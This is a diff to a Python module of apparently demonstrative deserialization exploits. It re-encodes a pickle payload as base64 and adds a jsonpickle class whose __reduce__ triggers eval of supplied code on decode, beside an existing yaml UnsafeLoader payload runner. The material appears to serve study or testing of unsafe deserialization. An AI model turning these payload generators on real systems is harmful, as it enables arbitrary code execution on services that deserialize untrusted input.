@@ -1,4 +1,6 @@
 import builtins
+import base64
+import jsonpickle
 import pickle
 import subprocess
 from pathlib import Path
@@ -130,10 +132,10 @@ class PickleLoadsExploit(SimplePythonExploit):
             def __reduce__(self):
                 return (eval, (source_code,))
 
-        return pickle.dumps(Exploit()).hex()
+        return base64.b64encode(pickle.dumps(Exploit()))
 
     def run_payload(payload: str) -> None:
-        payload = bytes.fromhex(payload)
+        payload = base64.b64decode(payload)
         obj = pickle.loads(payload)
 
 
@@ -157,6 +159,23 @@ class YamlLoadsExploit(SimplePythonExploit):
 
     def run_payload(payload: str) -> None:
         yaml.load(payload, Loader=yaml.UnsafeLoader)
+
+
+class JSONPickleLoadsExploit(SimplePythonExploit):
+    vulnerable_function = pickle.loads
+    source = (
+        "https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html"
+    )
+
+    def generate_payload(source_code: str) -> str:
+        class Exploit(object):
+            def __reduce__(self):
+                return (eval, (source_code,))
+
+        return jsonpickle.encode(Exploit())
+
+    def run_payload(payload: str) -> None:
+        obj = jsonpickle.decode(payload)
 
 
 class StringFormatExploit(SimplePythonExploit):
